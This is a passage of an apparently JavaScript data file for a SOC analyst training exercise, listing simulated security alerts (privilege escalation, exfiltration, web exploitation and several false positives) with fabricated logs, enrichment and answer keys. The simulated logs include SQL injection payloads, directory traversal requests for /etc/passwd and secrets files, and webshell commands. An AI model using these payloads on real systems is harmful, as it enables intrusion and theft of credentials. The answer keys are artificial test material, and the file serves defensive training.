          `${times[0]} AUTH logon user=${user} src=${randomInternalIP()} (support workstation)`,
          `${times[1]} AD event 4728: ${user} added to "Domain Admins" — performed_by=${user}`,
          `${times[2]} AD modification via direct LDAP write (bypassed IAM portal workflow)`,
          `${times[3]} AUTH logon user=${user} dst=${randomServer('DC')} — first ever DC access for this account`,
        ],
        enrichment: [
          { label: 'Change management', value: 'No CHG ticket, no approval workflow — IAM confirms nothing scheduled', tone: 'bad' },
          { label: 'Account role', value: `${user} — customer support; zero administrative duties`, tone: 'bad' },
          { label: 'Self-elevation', value: 'Account added ITSELF to Domain Admins — requires already-stolen privileges', tone: 'bad' },
          { label: 'Post-change activity', value: 'Immediate logon to a domain controller', tone: 'bad' },
        ],
        explanation: 'A support account adding itself to Domain Admins outside the change process, then immediately touching a domain controller, is unambiguous privilege escalation — self-elevation is only possible if the attacker already holds elevated access somewhere. Domain-admin compromise is a worst-case scenario: escalate immediately for emergency response.',
      }
    },
  },
  {
    id: 'priv-system', tier: 2, verdict: 'tp', category: 'privesc',
    correctAction: 'escalate', severity: 'high', source: 'EDR',
    ruleName: 'Suspicious Service Creation — SYSTEM Execution',
    build() {
      const ws = randomWorkstation()
      const user = randomUser()
      const times = timeSequence(4, 20, 90)
      const svcName = `svc${randInt(100, 999)}`
      return {
        title: `Service "${svcName}" created for SYSTEM execution on ${ws}`,
        entity: ws,
        description: `EDR detected creation of Windows service "${svcName}" on ${ws} by standard user "${user}". The service binPath points to a renamed copy of cmd.exe, and the service was started once and deleted 90 seconds later — a known pattern for one-shot SYSTEM privilege escalation. A SYSTEM shell subsequently modified the local security policy.`,
        logs: [
          `${times[0]} EDR service created name=${svcName} binPath="C:\\Users\\${user}\\AppData\\Local\\temp\\update.exe" by=${user}`,
          `${times[1]} EDR service started: update.exe running as NT AUTHORITY\\SYSTEM (parent: services.exe)`,
          `${times[2]} EDR SYSTEM process: secedit /configure — local security policy modified (EDR tamper settings)`,
          `${times[3]} EDR service deleted name=${svcName} by=${user} (lifetime: 94 seconds)`,
        ],
        enrichment: [
          { label: 'Technique', value: 'Service creation for privilege escalation (MITRE T1543.003), create-run-delete pattern', tone: 'bad' },
          { label: 'User', value: `${user} — standard user; local service creation should be impossible (indicates prior exploit)`, tone: 'bad' },
          { label: 'Payload behavior', value: 'SYSTEM shell attempted to weaken EDR tamper protection', tone: 'bad' },
          { label: 'Binary', value: 'update.exe = renamed cmd.exe (hash match)', tone: 'bad' },
        ],
        explanation: 'A standard user creating a service that runs as SYSTEM and then deleting it is a classic escalation-and-cleanup sequence — and the SYSTEM shell going straight for EDR tamper settings shows clear malicious intent. The user account or host is compromised and the attacker now has SYSTEM on the box. Escalate for isolation and forensics.',
      }
    },
  },
  {
    id: 'priv-revert', tier: 3, verdict: 'tp', category: 'privesc',
    correctAction: 'escalate', severity: 'low', source: 'AD / Identity',
    ruleName: 'Privileged Group Change Reverted',
    build() {
      const user = randomUser()
      const admin = `adm-${randomUser()}`
      const mins = randInt(14, 25)
      const times = timeSequence(4, 300, 500)
      return {
        title: `Account ${user} added to "Server Operators", removed ${mins} min later`,
        entity: user,
        description: `Account "${user}" was added to the privileged "Server Operators" group by admin account "${admin}" at ${times[0]}, then REMOVED from the group ${mins} minutes later by the same admin account. During the membership window, ${user} authenticated to two file servers and a backup server. The SIEM scored this LOW because the group membership is already back to normal. ${admin}'s owner is on vacation this week (out-of-office set).`,
        logs: [
          `${times[0]} AD event 4732: ${user} added to "Server Operators" performed_by=${admin}`,
          `${times[1]} AUTH logon type=3 user=${user} dst=${randomServer('FS')} — first access ever`,
          `${times[2]} AUTH logon type=3 user=${user} dst=${randomServer('FS')}; dst=BACKUP-01 — shadow copy enumeration`,
          `${times[3]} AD event 4733: ${user} removed from "Server Operators" performed_by=${admin} (${mins} min window)`,
        ],
        enrichment: [
          { label: 'Add-then-remove', value: `${mins}-minute privileged window, then self-cleanup — track-covering pattern`, tone: 'bad' },
          { label: 'Performing admin', value: `${admin} — owner on vacation, OOO auto-reply active since Monday`, tone: 'bad' },
          { label: 'Activity during window', value: 'File server + backup access incl. shadow copy enumeration (credential theft prep)', tone: 'bad' },
          { label: 'Current group state', value: 'Normal — which is why SIEM auto-scored LOW', tone: 'warn' },
        ],
        explanation: 'The trap here is the LOW severity and the fact that "everything is back to normal". Temporary privilege grants followed by removal are how attackers cover their tracks — and the performing admin account belongs to someone on vacation, meaning those admin credentials are likely stolen. What happened during the window (shadow-copy enumeration on a backup server) suggests credential-database theft. Escalate: reverted changes are evidence, not resolution.',
      }
    },
  },

  // ------------------------- DATA EXFILTRATION ------------------------------
  {
    id: 'exfil-cloud', tier: 2, verdict: 'tp', category: 'exfil',
    correctAction: 'escalate', severity: 'high', source: 'Web Proxy',
    ruleName: 'Large Upload to Personal Cloud Storage',
    build() {
      const { name, user } = randomFullNameAndUser()
      const gb = (randInt(28, 62) / 10).toFixed(1)
      const ws = randomWorkstation()
      const times = timeSequence(4, 400, 900)
      return {
        title: `${gb} GB uploaded to personal cloud storage — ${user}`,
        entity: user,
        description: `Web proxy logged ${gb} GB uploaded from ${ws} (user ${user}) to a PERSONAL Google Drive account (consumer gmail address, not the corporate tenant) between 01:10 and 02:35. The uploaded files enumerate as CRM exports and pricing spreadsheets. HR records show ${name} submitted resignation two weeks ago; last working day is Friday.`,
        logs: [
          `${times[0]} PROXY POST drive.google.com upload session start user=${user} host=${ws} account=personal (${user}.priv@gmail.com)`,
          `${times[1]} PROXY upload chunk: crm_full_export_Q2.csv (840 MB)`,
          `${times[2]} PROXY upload chunk: customer_pricing_master.xlsx + 214 more files`,
          `${times[3]} PROXY upload session complete bytes=${gb}GB duration=85min`,
        ],
        enrichment: [
          { label: 'Destination', value: 'Personal consumer Google account — NOT the corporate Workspace tenant', tone: 'bad' },
          { label: 'Content', value: 'CRM exports, customer lists, pricing masters — crown-jewel sales data', tone: 'bad' },
          { label: 'HR context', value: `${name} — resignation submitted, departing Friday (flight-risk profile)`, tone: 'bad' },
          { label: 'Baseline', value: 'User\'s prior 90-day upload average: 40 MB/day', tone: 'bad' },
        ],
        explanation: 'The three signals that separate this from routine cloud sync: destination is a personal account (corporate OneDrive/Workspace sync is normal; consumer gmail is not), content is exported customer data far outside the user\'s daily pattern, and the user is a departing employee — the highest-risk insider profile. Data has already left the company, so escalate for legal/HR response and access suspension.',
      }
    },
  },
  {
    id: 'exfil-staging', tier: 3, verdict: 'tp', category: 'exfil',
    correctAction: 'escalate', severity: 'high', source: 'EDR',
    ruleName: 'Mass File Compression Followed by Outbound Transfer',
    build() {
      const srv = randomServer('FS')
      const ip = randomExternalIP()
      const files = randInt(9000, 24000)
      const times = timeSequence(5, 300, 800)
      return {
        title: `Mass compression on ${srv} followed by outbound transfer`,
        entity: srv,
        description: `EDR observed 7za.exe on file server ${srv} compressing ${files.toLocaleString()} files from the legal and finance shares into split archives (arch.7z.001–.009, password-protected), written to C:\\Windows\\Temp. Forty minutes later, an outbound HTTPS stream of matching total size went to ${ip}. 7-Zip is not deployed on servers in this environment.`,
        logs: [
          `${times[0]} EDR process: 7za.exe a -p -v900m C:\\Windows\\Temp\\arch.7z @filelist.txt host=${srv}`,
          `${times[1]} FILE read burst: ${files.toLocaleString()} files from \\\\${srv}\\legal$ and \\\\${srv}\\finance$`,
          `${times[2]} FILE created: arch.7z.001 ... arch.7z.009 (total 7.8 GB, password protected)`,
          `${times[3]} NET out src=${srv} dst=${ip}:443 bytes_out=7.9GB duration=38min tls_sni=-`,
          `${times[4]} FILE deleted: arch.7z.* + filelist.txt (cleanup after transfer)`,
        ],
        enrichment: [
          { label: 'Staging pattern', value: 'Compress → password-protect → split volumes → transfer → delete = exfiltration kill chain', tone: 'bad' },
          { label: 'Tooling', value: '7za.exe not part of server build; binary appeared 2 hours before use', tone: 'bad' },
          { label: 'Destination', value: `${ip} — VPS provider, no business relationship, direct-to-IP TLS`, tone: 'bad' },
          { label: 'Data scope', value: 'Legal + finance shares — contracts, deal records', tone: 'bad' },
        ],
        explanation: 'Compression of thousands of files into password-protected split archives is exfiltration staging — attackers package data before moving it to survive size limits and hide contents from DLP. The full chain is here: staging, transfer to an unaffiliated VPS, then cleanup. 7.8 GB of legal and finance data has left the network. Escalate as a confirmed data breach.',
      }
    },
  },
  {
    id: 'exfil-blocked', tier: 3, verdict: 'tp', category: 'exfil',
    correctAction: 'close', severity: 'medium', source: 'Firewall',
    ruleName: 'Outbound Transfer to Unsanctioned Service Blocked',
    build() {
      const { user } = randomFullNameAndUser()
      const ws = randomWorkstation()
      const times = timeSequence(4, 60, 240)
      return {
        title: `Blocked outbound FTP transfer attempts from ${ws}`,
        entity: user,
        description: `Egress firewall blocked 14 consecutive outbound FTP (port 21) connection attempts from ${ws} (user ${user}) to a consumer file-hosting service between ${times[0]} and ${times[3]}. FTP is denied by egress policy for all workstations. Zero bytes of payload data left the network — every connection failed at the SYN stage. EDR shows the initiating process was FileZilla, installed by the user 20 minutes earlier, since auto-removed by software policy.`,
        logs: [
          `${times[0]} FW DROP src=${ws} dst=files-share-host.com:21 proto=TCP (egress policy: FTP denied)`,
          `${times[1]} FW DROP src=${ws} dst=files-share-host.com:21 proto=TCP (x13 retries)`,
          `${times[2]} EDR process: filezilla.exe user=${user} — unapproved software, auto-uninstalled by policy agent`,
          `${times[3]} FW DROP final attempt; no further egress anomalies from ${ws}`,
        ],
        enrichment: [
          { label: 'Data transferred', value: '0 bytes — all connections blocked at SYN, no session established', tone: 'ok' },
          { label: 'User context', value: `${user} — designer; says (per asset notes) large media files "won't email"`, tone: 'warn' },
          { label: 'Software', value: 'FileZilla auto-removed by endpoint policy; no persistence, no malware indicators', tone: 'ok' },
          { label: 'Follow-on activity', value: 'None — user went back to corporate file share afterwards', tone: 'ok' },
        ],
        explanation: 'A true positive in the sense that the policy violation genuinely happened — a user tried to push files out via unsanctioned FTP. But the egress filter blocked everything, zero data left, the tool was auto-removed, and there are no malware indicators; this reads as an employee taking a shortcut, not an attacker. Document it, close it, and flag the policy violation to the user\'s manager through the normal (non-incident) channel. Escalating to L2 incident response is not warranted for a fully blocked attempt with a benign profile.',
      }
    },
  },

  // ------------------------- EXPLOITATION -----------------------------------
  {
    id: 'exploit-waf', tier: 1, verdict: 'tp', category: 'exploit',
    correctAction: 'close', severity: 'medium', source: 'WAF / Web',
    ruleName: 'SQL Injection Attempts Blocked',
    build() {
      const ip = randomExternalIP()
      const count = randInt(120, 400)
      const times = timeSequence(4, 2, 10)
      return {
        title: `${count} SQL injection attempts against /login — all blocked`,
        entity: ip,
        description: `WAF blocked ${count} HTTP requests from ${ip} against the customer portal login endpoint containing SQL injection payloads (' OR '1'='1, UNION SELECT, sleep()-based probes). Every request returned 403 from the WAF; none reached the application server. The scanner signature matches an open-source SQLi tool with default settings.`,
        logs: [
          `${times[0]} WAF BLOCK 403 src=${ip} uri=/login payload="admin' OR '1'='1'--" rule=sqli-001`,
          `${times[1]} WAF BLOCK 403 src=${ip} uri=/login payload="' UNION SELECT username,password FROM users--" rule=sqli-002`,
          `${times[2]} WAF BLOCK 403 src=${ip} uri=/login payload="1' AND sleep(5)--" rule=sqli-007  ... (${count - 3} more, all 403)`,
          `${times[3]} APP server access log: zero requests from ${ip} (WAF terminated all)`,
        ],
        enrichment: [
          { label: 'Block rate', value: `${count}/${count} requests blocked — none reached the application`, tone: 'ok' },
          { label: 'Tool fingerprint', value: 'sqlmap default user-agent — automated, untargeted scanning', tone: 'ok' },
          { label: 'Source IP', value: `${ip} — flagged for mass web scanning across the internet`, tone: 'bad' },
          { label: 'App response codes', value: 'No 200s, no 500s to attack traffic — no sign any payload executed', tone: 'ok' },
        ],
        explanation: 'Genuine SQL injection attempts (true positive), but the WAF blocked 100% of them and nothing reached the application. Automated SQLi scanning with default tooling hits every public website daily. A fully blocked, untargeted exploitation attempt is documented and closed — escalation adds nothing when there is no impact to respond to.',
      }
    },
  },
  {
    id: 'exploit-traversal', tier: 2, verdict: 'tp', category: 'exploit',
    correctAction: 'escalate', severity: 'high', source: 'WAF / Web',
    ruleName: 'Directory Traversal — Anomalous Response Sizes',
    build() {
      const ip = randomExternalIP()
      const times = timeSequence(5, 10, 40)
      return {
        title: `Directory traversal against legacy app — 200 responses observed`,
        entity: ip,
        description: `Web logs show ${ip} probing the legacy invoicing application with directory traversal payloads (../../ sequences). The legacy app is NOT behind the WAF. Most probes returned 404, but four requests returned HTTP 200 with response sizes consistent with real file contents — including one matching /etc/passwd format length and one .env file.`,
        logs: [
          `${times[0]} WEB 404 src=${ip} GET /invoice/view?file=../../../../etc/shadow bytes=210`,
          `${times[1]} WEB 200 src=${ip} GET /invoice/view?file=../../../../etc/passwd bytes=2847`,
          `${times[2]} WEB 200 src=${ip} GET /invoice/view?file=../../.env bytes=1104`,
          `${times[3]} WEB 200 src=${ip} GET /invoice/view?file=../../config/database.yml bytes=933`,
          `${times[4]} WEB 200 src=${ip} GET /invoice/view?file=../../../../var/www/app/secrets.json bytes=1560`,
        ],
        enrichment: [
          { label: 'Success indicators', value: 'Four HTTP 200s with plausible file-content sizes — traversal likely worked', tone: 'bad' },
          { label: 'Exposed material', value: '.env + database.yml + secrets.json = credentials and connection strings', tone: 'bad' },
          { label: 'WAF coverage', value: 'Legacy app is not proxied by the WAF — no blocking layer', tone: 'warn' },
          { label: 'Follow-up traffic', value: `${ip} began authenticated-looking requests 10 min later`, tone: 'bad' },
        ],
        explanation: 'The difference between this and blocked scanning is the response codes: HTTP 200 with realistic content lengths on /etc/passwd and .env means the traversal likely succeeded and secrets were read. The attacker\'s shift to authenticated-looking requests suggests stolen credentials are already in use. This is an active breach of an unprotected legacy app — escalate for credential rotation and app takedown.',
      }
    },
  },
  {
    id: 'exploit-webshell', tier: 3, verdict: 'tp', category: 'exploit',
    correctAction: 'escalate', severity: 'medium', source: 'WAF / Web',
    ruleName: 'Anomalous POST to Static Content Path',
    build() {
      const ip = randomExternalIP()
      const shell = `${pick(['theme_helper', 'cache_mgr', 'img_proc'])}.php`
      const times = timeSequence(5, 60, 300)
      return {
        title: `POST requests to unusual path /uploads/${shell}`,
        entity: 'web-portal-01',
        description: `Anomaly rule flagged POST requests to /uploads/${shell} on the careers site. The /uploads directory should only ever serve static CV files. The PHP file appeared after a résumé upload at ${times[0]} that bypassed the extension filter using a double extension (cv.pdf.php). Requests to the file return 200 and response times vary with the supplied "cmd" parameter. Traffic volume is tiny — 6 requests — so the SIEM scored it MEDIUM.`,
        logs: [
          `${times[0]} WEB 200 POST /careers/apply file=cv.pdf.php (upload accepted, filter bypass)`,
          `${times[1]} WEB 200 GET /uploads/${shell}?cmd=whoami bytes=61 time=0.02s src=${ip}`,
          `${times[2]} WEB 200 GET /uploads/${shell}?cmd=id;uname+-a bytes=188 time=0.03s src=${ip}`,
          `${times[3]} WEB 200 POST /uploads/${shell} body_size=4KB time=1.9s src=${ip}`,
          `${times[4]} EDR web-portal-01: www-data spawned /bin/sh ← apache2 (shell from web server process)`,
        ],
        enrichment: [
          { label: 'File origin', value: `${shell} uploaded via careers form using double-extension bypass`, tone: 'bad' },
          { label: 'Behavior', value: 'cmd parameter + www-data spawning /bin/sh = interactive webshell', tone: 'bad' },
          { label: 'Volume', value: 'Only 6 requests — quiet, hands-on-keyboard operator, not a scanner', tone: 'warn' },
          { label: 'Server exposure', value: 'web-portal-01 has network route to internal app tier', tone: 'bad' },
        ],
        explanation: 'Low volume made this look minor, but the content is severe: an upload-filter bypass placed a PHP webshell on the server, and the web server process spawning /bin/sh confirms remote command execution. Six quiet requests means a human operator, not a scanner — quieter is worse. Escalate immediately: the server is attacker-controlled and bridges to the internal network.',
      }
    },
  },
]

// ---------------------------------------------------------------------------
// FALSE POSITIVES
// ---------------------------------------------------------------------------

const FP = [

  {
    id: 'fp-typo-password', tier: 1, verdict: 'fp', category: 'brute_force',
    correctAction: 'close', severity: 'low', source: 'AD / Identity',
    ruleName: 'Multiple Failed Logons — Single Source',
    build() {
      const { name, user } = randomFullNameAndUser()
      const ws = randomWorkstation()
      const times = timeSequence(4, 15, 40)
      return {
        title: `3 failed logons followed by success — account ${user}`,
        entity: user,
        description: `Account "${user}" recorded 3 failed logon attempts followed by a successful logon at ${times[3]}, from the user's own assigned workstation ${ws} on the office LAN. The failures occurred within 90 seconds of each other. The user badge-in log shows ${name} entered the building 10 minutes earlier.`,
        logs: [
          `${times[0]} AUTH FAIL user=${user} src=${ws} (office LAN) reason=bad_password`,
          `${times[1]} AUTH FAIL user=${user} src=${ws} reason=bad_password`,
          `${times[2]} AUTH FAIL user=${user} src=${ws} reason=bad_password`,
          `${times[3]} AUTH SUCCESS user=${user} src=${ws} session=interactive (console logon)`,
        ],
        enrichment: [
          { label: 'Rule trigger', value: 'Failed-logon sequence ending in success — the same shape as a credential attack', tone: 'warn' },
          { label: 'Source', value: `${ws} — the user's own assigned workstation, physical console logon`, tone: 'ok' },
          { label: 'Badge records', value: `${name} badged into the office 10 minutes before the logons`, tone: 'ok' },
          { label: 'Volume', value: '3 failures — typical of a mistyped password after a password change', tone: 'ok' },
          { label: 'Password age', value: 'Password was changed yesterday (forgetting a new password is common)', tone: 'ok' },
        ],
        explanation: 'This is what a human mistyping a new password looks like: 2–3 failures at the physical console of their own machine, with badge records confirming they\'re in the building. Brute force means dozens of attempts, remote sources, or many accounts. Volume and context separate the two — this is a clean false positive.',
      }
    },
  },
  {
    id: 'fp-backup', tier: 1, verdict: 'fp', category: 'exfil',
    correctAction: 'close', severity: 'medium', source: 'Network / DLP',
    ruleName: 'Large Off-Hours Data Transfer',
    build() {
      const gb = randInt(400, 900)
      const srv = randomServer('FS')
      const times = timeSequence(4, 600, 1200)
      return {
        title: `${gb} GB transfer from ${srv} at 01:00`,
        entity: srv,
        description: `Volume-based rule fired on a ${gb} GB data transfer from file server ${srv} beginning at 01:00. Destination is BACKUP-01 (10.60.0.5), the dedicated backup appliance on the internal backup VLAN. The transfer matches the nightly Veeam job "FS-Nightly-Full" which runs Mon/Wed/Fri at 01:00 per the backup schedule.`,
        logs: [
          `${times[0]} NET flow src=${srv} dst=10.60.0.5 (BACKUP-01) port=10006 proto=VeeamAgent bytes=${gb}GB`,
          `${times[1]} VEEAM job "FS-Nightly-Full" started (scheduled Mon/Wed/Fri 01:00)`,
          `${times[2]} VEEAM job progress 64% — throughput consistent with prior runs`,
          `${times[3]} Historical: same src/dst/volume pattern every Mon/Wed/Fri for 14 months`,
        ],
        enrichment: [
          { label: 'Rule trigger', value: `${gb} GB moved off-hours — dozens of times above the volume threshold`, tone: 'bad' },
          { label: 'Destination', value: 'BACKUP-01 — internal backup appliance; traffic never leaves the network', tone: 'ok' },
          { label: 'Schedule match', value: 'Exact match to registered Veeam job, 14 months of identical history', tone: 'ok' },
          { label: 'Direction', value: 'Internal VLAN to internal VLAN — no external egress involved', tone: 'ok' },
        ],
        explanation: 'Exfiltration requires data leaving your control — this transfer goes to the company\'s own backup appliance on an internal VLAN, on a documented schedule, matching 14 months of history. Big off-hours transfers are exactly what backups look like; always check destination and schedule before calling exfiltration. False positive; consider tuning the rule to exclude the backup VLAN.',
      }
    },
  },
  {
    id: 'fp-vulnscan', tier: 1, verdict: 'fp', category: 'recon',
    correctAction: 'close', severity: 'medium', source: 'IDS / Network',
    ruleName: 'Internal Port Scan Detected',
    build() {
      const hosts = randInt(200, 500)
      const times = timeSequence(4, 30, 120)
      return {
        title: `Port scan of ${hosts} internal hosts from 10.8.8.20`,
        entity: 'VULNSCAN-01',
        description: `IDS flagged systematic port scanning of ${hosts} internal hosts originating from 10.8.8.20. That address is VULNSCAN-01, the security team's Nessus vulnerability scanner, located in the dedicated scanner subnet (10.8.8.0/24). The weekly authenticated scan window is documented as Thursday 00:00–04:00, which matches the current time.`,
        logs: [
          `${times[0]} IDS scan pattern: src=10.8.8.20 targets=10.20.0.0/16 ports=top-1000`,
          `${times[1]} CMDB lookup 10.8.8.20 → VULNSCAN-01 (Nessus, owner: Security Engineering)`,
          `${times[2]} Scan schedule: "Weekly-Internal-Full" Thu 00:00–04:00 — currently in window`,
          `${times[3]} Scanner service account authenticating to targets (credentialed scan)`,
        ],
        enrichment: [
          { label: 'Observed behavior', value: `SYN sweep of top-1000 ports across ${hosts} hosts — by traffic alone, indistinguishable from hostile recon`, tone: 'bad' },
          { label: 'Source asset', value: 'VULNSCAN-01 — registered Nessus scanner in the CMDB, security-owned', tone: 'ok' },
          { label: 'Schedule', value: 'Active scan is inside its documented weekly window', tone: 'ok' },
          { label: 'Behavior', value: 'Credentialed scanning with the registered scanner service account', tone: 'ok' },
        ],
        explanation: 'Vulnerability scanners look exactly like attackers by design — that\'s their job. The difference is provenance: a CMDB-registered scanner appliance, in its dedicated subnet, inside its documented scan window, using its registered service account. Verify those four things and this is a routine false positive. (If the same pattern came from a random workstation, it would be a serious alert.)',
      }
    },
  },
  {
    id: 'fp-av-push', tier: 1, verdict: 'fp', category: 'lateral',
    correctAction: 'close', severity: 'low', source: 'EDR',
    ruleName: 'Single Account Authenticating to Many Hosts',
    build() {
      const hosts = randInt(150, 400)
      const times = timeSequence(4, 20, 60)
      return {
        title: `Account svc-sccm authenticated to ${hosts} hosts in 30 minutes`,
        entity: 'svc-sccm',
        description: `Identity rule flagged service account "svc-sccm" performing network logons to ${hosts} endpoints within 30 minutes. The account is the SCCM (endpoint management) deployment service account, and the activity correlates with tonight's scheduled deployment of the monthly Windows security patch (deployment "Patch-Tuesday-Rollout" started 00:30).`,
        logs: [
          `${times[0]} AUTH logon type=3 user=svc-sccm — ${hosts} hosts, pattern: entire workstation OU`,
          `${times[1]} SCCM console: deployment "Patch-Tuesday-Rollout" status=in-progress targets=${hosts + randInt(20, 80)}`,
          `${times[2]} Process on endpoints: ccmexec.exe applying KB updates (signed Microsoft binaries)`,
          `${times[3]} Historical: identical fan-out pattern every second Tuesday for 3+ years`,
        ],
        enrichment: [
          { label: 'Observed behavior', value: `${hosts} hosts authenticated in 30 minutes — far beyond any human logon pattern`, tone: 'warn' },
          { label: 'Account', value: 'svc-sccm — endpoint management service account, expected to touch every host', tone: 'ok' },
          { label: 'Correlation', value: 'Active SCCM deployment job matches the logon set exactly', tone: 'ok' },
          { label: 'Payload', value: 'Signed Microsoft patches via ccmexec.exe — standard patching machinery', tone: 'ok' },
        ],
        explanation: 'Management infrastructure (SCCM, AV consoles, RMM tools) legitimately authenticates to hundreds of machines at once — the same shape as lateral movement, at a scale no attacker would attempt. The correlated deployment job, signed patches, and years of identical monthly history confirm patching. Knowing your environment\'s management accounts is core L1 knowledge; false positive.',
      }
    },
  },
  {
    id: 'fp-updater', tier: 2, verdict: 'fp', category: 'c2',
    correctAction: 'close', severity: 'medium', source: 'Web Proxy',
    ruleName: 'Periodic Outbound Connections',
    build() {
      const ws = randomWorkstation()
      const times = timeSequence(4, 3600, 3600)
      const vendor = pick([
        { proc: 'AdobeARM.exe', domain: 'armmf.adobe.com', name: 'Adobe Acrobat updater' },
        { proc: 'GoogleUpdate.exe', domain: 'update.googleapis.com', name: 'Google Chrome updater' },
        { proc: 'OfficeClickToRun.exe', domain: 'officecdn.microsoft.com', name: 'Microsoft Office update channel' },
      ])
      return {
        title: `Hourly outbound connections from ${ws} to ${vendor.domain}`,
        entity: ws,
        description: `Beaconing rule flagged ${ws} connecting to ${vendor.domain} exactly once per hour for the past 3 days. The initiating process is ${vendor.proc}, digitally signed by the vendor, running from Program Files. The domain is the vendor's official update CDN, and 96% of company workstations exhibit the identical pattern.`,
        logs: [
          `${times[0]} PROXY GET https://${vendor.domain}/check ua="${vendor.proc}" bytes_in=1204 host=${ws}`,
          `${times[1]} PROXY GET https://${vendor.domain}/check bytes_in=1204 host=${ws} (interval 3600s)`,
          `${times[2]} EDR: ${vendor.proc} signed=valid publisher verified, path=C:\\Program Files\\...`,
          `${times[3]} Fleet query: 1,847 of 1,920 workstations show identical hourly pattern to this domain`,
        ],
        enrichment: [
          { label: 'Beacon model score', value: '0.94 — near-perfect 3600s periodicity, exactly what C2 detection hunts for', tone: 'bad' },
          { label: 'Destination', value: `${vendor.domain} — official vendor update CDN, years of clean history`, tone: 'ok' },
          { label: 'Process', value: `${vendor.proc} — validly signed, correct install path (${vendor.name})`, tone: 'ok' },
          { label: 'Prevalence', value: '96% of the fleet does the same thing — company-wide software behavior', tone: 'ok' },
        ],
        explanation: 'Periodic connections alone don\'t make a beacon — every auto-updater on earth phones home on a schedule. The discriminators are prevalence and provenance: signed vendor binary, official vendor domain, and nearly the whole fleet behaving identically. Real C2 is typically one host (or few) talking to young, low-reputation infrastructure. False positive; whitelist the vendor CDN in the beacon rule.',
      }
    },
  },
  {
    id: 'fp-onboarding', tier: 2, verdict: 'fp', category: 'recon',
    correctAction: 'close', severity: 'low', source: 'AD / Identity',
    ruleName: 'New Account Accessing Multiple Systems',
    build() {
      const { name, user } = randomFullNameAndUser()
      const times = timeSequence(4, 300, 900)
      return {
        title: `New account ${user} accessed 9 systems on first day`,
        entity: user,
        description: `Account "${user}", created yesterday, authenticated to 9 different systems today: email, HR portal, CRM, file shares, intranet, timesheet, LMS training platform, VPN enrollment and the print server. A behavioral rule flagged the fan-out as potential reconnaissance. HR records show ${name} started today as a Sales Operations Specialist; the accessed systems match the standard sales onboarding checklist.`,
        logs: [
          `${times[0]} AUTH ${user} → mail, hr-portal, crm-prod (first logons, from assigned workstation)`,
          `${times[1]} AUTH ${user} → fs-shared, intranet, timesheet`,
          `${times[2]} AUTH ${user} → lms-training (completing mandatory security training)`,
          `${times[3]} IAM: access set matches "Sales Onboarding" role template exactly, granted via HR workflow`,
        ],
        enrichment: [
          { label: 'Anomaly score', value: 'HIGH — nine systems on day one; the account has no behavioral baseline yet', tone: 'warn' },
          { label: 'HR record', value: `${name} — start date today, Sales Operations (verified in HRIS)`, tone: 'ok' },
          { label: 'Access pattern', value: 'Exactly the systems in the sales onboarding checklist, no sensitive infra', tone: 'ok' },
          { label: 'Source', value: 'All logons from the assigned workstation at their desk, business hours', tone: 'ok' },
          { label: 'Provisioning', value: 'Accounts granted through the approved IAM workflow yesterday', tone: 'ok' },
        ],
        explanation: 'A brand-new account touching many systems in one day trips behavioral baselines because there is no baseline yet. Context resolves it: HR confirms a first-day employee, the systems match the role\'s onboarding template exactly, and everything comes from their desk during business hours. Reconnaissance targets infrastructure and privileged systems, not the timesheet app. False positive.',
      }
    },
  },
  {
    id: 'fp-marketing', tier: 2, verdict: 'fp', category: 'phishing',
    correctAction: 'close', severity: 'medium', source: 'Email Gateway',
    ruleName: 'Bulk Email with Shortened Links',
    build() {
      const total = randInt(800, 2400)
      const times = timeSequence(4, 30, 120)
      return {
        title: `Bulk email with bit.ly links to ${total} recipients`,
        entity: 'marketing@northbridgefinancial.com',
        description: `Gateway flagged an outbound bulk mailing from marketing@northbridgefinancial.com to ${total} external customers containing bit.ly shortened links. Link-shortener + bulk volume matched a phishing heuristic. The bit.ly links resolve to northbridgefinancial.com/summer-webinar, and the campaign "Summer Webinar Series" is registered in the marketing calendar with today's send date.`,
        logs: [
          `${times[0]} MAIL outbound from=marketing@northbridgefinancial.com recipients=${total} subject="Join our Summer Webinar Series"`,
          `${times[1]} GATEWAY heuristic match: shortened_links + bulk_volume score=medium`,
          `${times[2]} LINK resolve: bit.ly/nb-webinar → https://northbridgefinancial.com/summer-webinar (own domain)`,
          `${times[3]} DKIM/SPF/DMARC: all pass, sent via approved Mailchimp tenant`,
        ],
        enrichment: [
          { label: 'Heuristic hits', value: 'Shortened links + bulk volume — two classic phishing traits in one message', tone: 'warn' },
          { label: 'Link destination', value: 'Resolves to the company\'s own website — no external or lookalike domain', tone: 'ok' },
          { label: 'Campaign', value: '"Summer Webinar Series" registered in marketing calendar for today', tone: 'ok' },
          { label: 'Authentication', value: 'SPF/DKIM/DMARC pass via the approved bulk-mail provider', tone: 'ok' },
          { label: 'Direction', value: 'Outbound company campaign — not inbound mail targeting employees', tone: 'ok' },
        ],
        explanation: 'Shortened links look suspicious because phishers use them — but so does every marketing team. Resolve the link before judging: it lands on the company\'s own site, the campaign is scheduled and authenticated, and the mail is outbound marketing, not inbound attack. False positive; a sender-based exception for the approved bulk-mail tenant would stop the noise.',
      }
    },
  },
  {
    id: 'fp-real-vendor', tier: 2, verdict: 'fp', category: 'phishing',
    correctAction: 'close', severity: 'low', source: 'Email Gateway',
    ruleName: 'Keyword Match — Account Security Notification',
    build() {
      const total = randInt(3, 8)
      const times = timeSequence(3, 60, 300)
      return {
        title: `"Verify your account" emails from paypal.com — ${total} recipients`,
        entity: 'service@paypal.com',
        description: `Keyword rule flagged ${total} inbound emails with subject "Confirm your recent payment" from service@paypal.com. Unlike lookalike-domain phishing, these originate from the genuine paypal.com infrastructure: SPF, DKIM and DMARC all pass against paypal.com, and the embedded links go to https://www.paypal.com. Finance confirms the company PayPal account made vendor payments this evening.`,
        logs: [
          `${times[0]} MAIL inbound from=service@paypal.com to=finance-team subject="Confirm your recent payment" recipients=${total}`,
          `${times[1]} AUTH-RESULTS: spf=pass dkim=pass (d=paypal.com) dmarc=pass`,
          `${times[2]} LINKS: all resolve to https://www.paypal.com/* — genuine domain, valid TLS`,
        ],
        enrichment: [
          { label: 'Keyword hits', value: '"Confirm your recent payment" — matches the credential-phishing keyword set', tone: 'warn' },
          { label: 'Sender authentication', value: 'SPF/DKIM/DMARC pass for the real paypal.com — not a lookalike', tone: 'ok' },
          { label: 'Links', value: 'Point to www.paypal.com directly — no redirectors, no lookalikes', tone: 'ok' },
          { label: 'Business context', value: 'Finance made PayPal vendor payments tonight — expected notifications', tone: 'ok' },
        ],
